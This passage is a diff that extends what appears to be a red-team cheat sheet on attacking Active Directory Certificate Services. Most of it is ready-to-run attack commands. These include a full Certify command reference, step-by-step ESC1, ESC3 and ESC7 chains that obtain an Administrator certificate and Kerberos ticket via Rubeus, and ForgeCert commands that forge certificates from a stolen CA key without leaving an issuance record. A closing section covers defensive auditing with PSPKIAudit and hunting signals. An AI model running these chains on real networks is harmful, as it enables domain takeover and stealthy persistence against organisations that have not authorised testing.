@@ -337,10 +337,151 @@ Invoke-Locksmith -Scans PromptMe      # interactive selection menu
 Invoke-Locksmith -Scans ESC1,ESC3,ESC6,ESC8 -Mode 0
 ```
 
+## Certify — Full Command Reference
+
+Certify is the canonical Windows-side ADCS attack tool. Build from source (`Certify.sln` → Release). The subcommands below cover everything the wiki documents.
+
+```
+# Global flags:
+#   --out-file FILE    redirect output
+#   --quiet            suppress banner
+
+# Enumerate CAs (root, subordinate, enterprise, roles):
+Certify.exe enum-cas --filter-vulnerable --hide-admins
+Certify.exe enum-cas --ca CA-HOST\CA-NAME --show-all-perms --skip-web-checks
+
+# Enumerate templates (this is usually your first call):
+Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins
+Certify.exe enum-templates --filter-client-auth --filter-supply-subject
+Certify.exe enum-templates --template User                 # one template in detail
+
+# Enumerate PKI AD objects (NTAuthCertificates, CertPublishers, etc.):
+Certify.exe enum-pkiobjects --show-linked-oids --show-admins
+
+# Request a certificate (ESC1 / ESC6 / ESC9 usage):
+Certify.exe request --ca CA-HOST\CA-NAME --template VulnTemplate \
+  --upn administrator@corp.local \
+  --sid S-1-5-21-...-500
+
+# Request on behalf of (ESC3 enrollment-agent flow):
+Certify.exe request-agent --ca CA-HOST\CA-NAME --template User \
+  --target Administrator --agent-pfx base64_agent_pfx
+
+# Download a pending/issued request (ESC7 ManageCA flow):
+Certify.exe request-download --ca CA-HOST\CA-NAME --id 1337 --private-key key.pem
+
+# Renew an existing cert with the same key (useful for persistence):
+Certify.exe request-renew --ca CA-HOST\CA-NAME --cert-pfx old.pfx
+
+# Manage a template you now own/write (ESC4):
+Certify.exe manage-template --template WriteMe --client-auth
+Certify.exe manage-template --template WriteMe --supply-subject
+Certify.exe manage-template --template WriteMe --authorized-signatures 0
+Certify.exe manage-template --template WriteMe --manager-approval
+Certify.exe manage-template --template WriteMe --enroll S-1-5-11
+Certify.exe manage-template --template WriteMe --write-property S-1-5-11
+Certify.exe manage-template --template WriteMe --owner S-1-5-11
+
+# Manage a CA you have ManageCA on (ESC7):
+Certify.exe manage-ca --ca CA-HOST\CA-NAME --officer S-1-5-11
+Certify.exe manage-ca --ca CA-HOST\CA-NAME --issue-id 1337
+Certify.exe manage-ca --ca CA-HOST\CA-NAME --issuance-policy 1337:1.3.6.1.4...
+```
+
+### ESC1 — quick workflow with Certify + Rubeus
+
+```
+Certify.exe enum-templates --filter-vulnerable --hide-admins
+Certify.exe request --ca CA\CA-NAME --template VulnUser \
+  --upn Administrator@corp.local --sid S-1-5-21-...-500
+# Paste the base64 PFX into Rubeus:
+Rubeus.exe asktgt /user:Administrator /certificate:base64_pfx /password:CertifyIL /ptt
+```
+
+### ESC3 — enrollment-agent chain
+
+```
+# 1. Request the EA cert yourself:
+Certify.exe request --ca CA\CA-NAME --template EnrollmentAgent
+# 2. Find downstream templates:
+Certify.exe enum-templates --filter-enabled --filter-request-agent
+# 3. Request on-behalf-of Administrator:
+Certify.exe request-agent --ca CA\CA-NAME --template User \
+  --target Administrator --agent-pfx base64_ea_pfx
+# 4. Authenticate:
+Rubeus.exe asktgt /user:Administrator /certificate:base64_pfx /ptt
+```
+
+### ESC7 — ManageCA → self-signed officer → issue denied request
+
+```
+Certify.exe request --ca CA\CA-NAME --template UserRestricted --upn Admin@corp.local   # gets denied → note request-id
+Certify.exe manage-ca --ca CA\CA-NAME --officer S-1-5-21-...-yourSID
+Certify.exe manage-ca --ca CA\CA-NAME --issue-id <denied-request-id>
+Certify.exe request-download --ca CA\CA-NAME --id <id> --private-key key.pem
+```
+
+## ForgeCert — Offline Cert Forgery From CA Key
+
+If you ever get hands on the CA's private key (extracted via DPAPI, backup, SharpDPAPI `/machine`, or HSM export), ForgeCert lets you **forge a certificate for any user** without talking to the CA at all — completely offline, no issuance events on the CA.
+
+```
+# Forge a cert authenticating as localadmin of corp.local:
+ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword "Password123!" \
+  --Subject "CN=User" \
+  --SubjectAltName "administrator@corp.local" \
+  --NewCertPath admin.pfx --NewCertPassword "NewPass!23"
+
+# Use it:
+Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /password:NewPass!23 /ptt
+
+# Optional — for subordinate CA, specify CRL path:
+ForgeCert.exe --CaCertPath subCA.pfx --CaCertPassword "..." --CRL "ldap:///CN=..." ...
+```
+
+Because no request ever touches the real CA, there is **no CA issuance record** of this certificate — detection must happen at DC Kerberos auth layer (unexpected cert issuer, unexpected SAN for the target user, `msDS-KeyCredentialLink` absent). This makes CA key exfiltration one of the most valuable persistence finds in an engagement.
+
+## PSPKIAudit — Defensive / Purple-Team Auditing
+
+PSPKIAudit is a PowerShell module from GhostPack that mirrors the checks Certify / Certipy run, but from the defender's perspective. Useful on purple-team engagements to verify your Certify findings against an authoritative tool and to hand remediation evidence to the blue team.
+
+```
+# Install (unblock DLLs first — required on some systems):
+git clone https://github.com/GhostPack/PSPKIAudit
+cd PSPKIAudit
+Get-ChildItem -Recurse | Unblock-File
+Import-Module .\PSPKIAudit.psd1
+
+# One-shot forest-wide audit — ESC1..ESC8:
+Invoke-PKIAudit
+
+# Focus on a single CA:
+Invoke-PKIAudit -CAComputerName CA01.corp.local
+
+# Per-cmdlet auditing:
+Get-AuditCertificateAuthority     # ACL, EDITF flag, ESC6/ESC7/ESC8 surface
+Get-AuditCertificateTemplate      # EKUs, enrollment rights, ESC1/ESC2/ESC3
+Get-CertRequest -CAComputerName CA01.corp.local   # dump issued cert history to hunt abuse
+```
+
+What it flags:
+
+- ESC1/2 — permissive templates with client-auth + supply-subject-in-request
+- ESC3 — enrollment agent templates with permissive enrollment
+- ESC4/5 — dangerous ACLs on templates and PKI objects
+- ESC6 — `EDITF_ATTRIBUTESUBJECTALTNAME2` enabled on the CA
+- ESC7 — ManageCA / ManageCertificates delegated to non-admins
+- ESC8 — HTTP/HTTPS enrollment web services without channel binding
+
+Pair a `Get-CertRequest` pull with the CA database for hunting after the fact — a disabled "Administrator" account that suddenly has a client-auth cert issued to it is a strong signal of an ESC1 abuse that already happened.
+
 ## Resources
 
 - Certipy — `github.com/ly4k/Certipy`
 - Certify — `github.com/GhostPack/Certify`
+- Certify wiki — `github.com/GhostPack/Certify/wiki`
+- ForgeCert — `github.com/GhostPack/ForgeCert`
+- PSPKIAudit — `github.com/GhostPack/PSPKIAudit`
 - Locksmith — `github.com/jakehildreth/Locksmith`
 - SpecterOps — Certified Pre-Owned whitepaper — `specterops.io/assets/resources/Certified_Pre-Owned.pdf`
 - MITRE ATT&CK T1649 — Steal or Forge Authentication Certificates — `attack.mitre.org/techniques/T1649/`
